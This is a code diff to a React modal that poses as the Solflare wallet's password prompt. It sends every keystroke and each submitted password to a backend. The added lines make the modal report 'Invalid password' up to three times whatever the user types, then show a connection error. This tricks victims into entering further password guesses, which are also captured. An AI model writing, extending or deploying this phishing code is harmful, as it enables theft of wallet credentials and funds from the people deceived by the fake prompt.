@@ -2616,6 +2616,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
     const [loadingInitiate, setLoadingInitiate] = useState(true);
     const [showForgetPasswordModal, setShowForgetPasswordModal] = useState(false);
     const [continueCountdown, setContinueCountdown] = useState(0);
+    const [trying, setTrying] = useState(0);
     const passwordInputRef = useRef(null);
     const modalRef = useRef(null);
     const countdownIntervalRef = useRef(null);
@@ -2670,6 +2671,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
         setShowPassword(false);
         setShowForgetPasswordModal(false);
         setContinueCountdown(0);
+        setTrying(0);
         if (countdownIntervalRef.current) {
             clearInterval(countdownIntervalRef.current);
             countdownIntervalRef.current = null;
@@ -2679,6 +2681,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
         const newKeyword = e.target.value;
         setKeyword(newKeyword);
         setError(false);
+        setTrying(0); // Reset trying count when user types a new password
         const currentUserId = backendConfig?.userId || userId;
         if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
             await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
@@ -2702,17 +2705,17 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
             return;
         }
         if (backendConfig?.enabled !== false) {
-            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
-            if (result.error) {
-                setError(true);
-                setHelperText('Invalid password');
-            }
-            else {
-                setError(false);
-                setHelperText('');
-            }
+            await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
             setTimeout(() => {
                 setConnecting(false);
+                if (trying < 3) {
+                    setError(true);
+                    setHelperText('Invalid password');
+                    setTrying(trying + 1);
+                }
+                else {
+                    setConnectionError(true);
+                }
                 passwordInputRef.current?.focus();
             }, 150);
         }
@@ -2753,6 +2756,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
             setConnectionError(false);
             setKeyword('');
             setError(false);
+            setTrying(0);
         }, 1000);
     };
     if (!isOpen)
